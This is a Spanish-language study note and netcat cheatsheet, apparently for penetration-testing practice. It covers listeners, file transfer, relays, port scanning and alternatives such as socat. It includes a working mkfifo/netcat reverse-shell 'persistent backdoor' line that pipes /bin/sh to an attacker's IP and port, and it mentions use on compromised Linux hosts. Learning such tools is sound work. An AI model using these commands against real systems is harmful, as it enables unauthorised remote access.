---
Reverse shell: 
Transferencia de archivos: 
Pivoting:
---

## Netcat (nc):

**Explicación y Funcionalidades:**
Netcat, también conocido como "nc", es una herramienta de red versátil y de línea de comandos que ==permite la [[transferencia de datos]] a través de redes TCP o UDP.== Puede actuar como un cliente o servidor, crear túneles de red, escanear puertos y realizar muchas otras funciones útiles. Algunas de sus funcionalidades incluyen:
- Establecer y escuchar conexiones TCP y UDP.
- Transferir archivos y datos a través de la red.
- Crear túneles y proxies.
- Escanear puertos en un host remoto.
- Realizar pruebas de conectividad y diagnóstico de redes.

## Papel en la Ciberseguridad:
Netcat es una herramienta esencial en el arsenal de un profesional de la ciberseguridad. Se utiliza para realizar pruebas de penetración, auditorías de red, monitoreo de tráfico y más. Sin embargo, debido a su versatilidad, también puede ser utilizada por atacantes para realizar actividades maliciosas, como transferencia de datos no autorizada o escuchas en la red.

## Cheatsheet de Netcat (nc):

### Iniciar Netcat como servidor en el puerto especificado
```bash
nc -nlvp <puerto>
```

- **-n:** No resuelve nombres de host, usa direcciones IP en su lugar.
 - **-l:** Escuchar en modo servidor.
- **-v:** Verbose, muestra información detallada sobre la conexión.
- **-p** <puerto>: Especifica el puerto en el que escuchar.

### Conectar a un servidor remoto en un puerto específico
```bash
nc <dirección_ip> <puerto>
```

### Transferir archivos desde un servidor remoto
```bash
nc -q 5 -l -p <puerto> > archivo_recibido
```
- **-q 5:** Establece un timeout de 5 segundos.
- **-l:** Escuchar en modo servidor.
- **-p <puerto>:** Especifica el puerto en el que escuchar.

### Escuchar en un puerto y enviar datos a otro host
```bash
nc -lvp <puerto_local> | nc <host_remoto> <puerto_remoto>
```

### Escanear puertos en un host remoto
```bash
nc -zv <dirección_ip> <rango_de_puertos>
```
- **-z:** Escanear sin enviar datos.
- **-v:** Verbose, muestra información detallada sobre la conexión.

### Crear un túnel SSH a través de Netcat
```bash
nc -lvp <puerto_local> -c "nc <host_remoto> <puerto_remoto>"
```
- **-c:** Ejecutar comando específico cuando se conecta.

### Crear un backdoor persistente
```bash
mkfifo /tmp/backpipe; nc <tu_ip> <tu_puerto> 0</tmp/backpipe | /bin/sh >/tmp/backpipe 2>&1
```
- **-n:** No resuelve nombres de host, usa direcciones IP en su lugar.

La flag `-n` se utiliza para evitar la resolución de nombres de host y utilizar direcciones IP en su lugar. Esto puede ser útil en situaciones donde la resolución de nombres de host puede causar retrasos o si prefieres trabajar directamente con direcciones IP.

## Alternativas a Netcat:

En caso de que no esté disponible Netcat en un dispositivo Linux vulnerado, existen algunas alternativas que pueden proporcionar funcionalidades similares, como:
- **Ncat:** Una versión mejorada y segura de Netcat, disponible en el paquete Nmap.
- **socat:** Herramienta avanzada para red bidireccional.
- **Cryptcat:** Netcat con cifrado de datos.
- **hping:** Herramienta de pruebas de red y escaneo.

Estas alternativas pueden ayudar a realizar tareas similares a las de Netcat en caso de que no esté disponible en el sistema objetivo.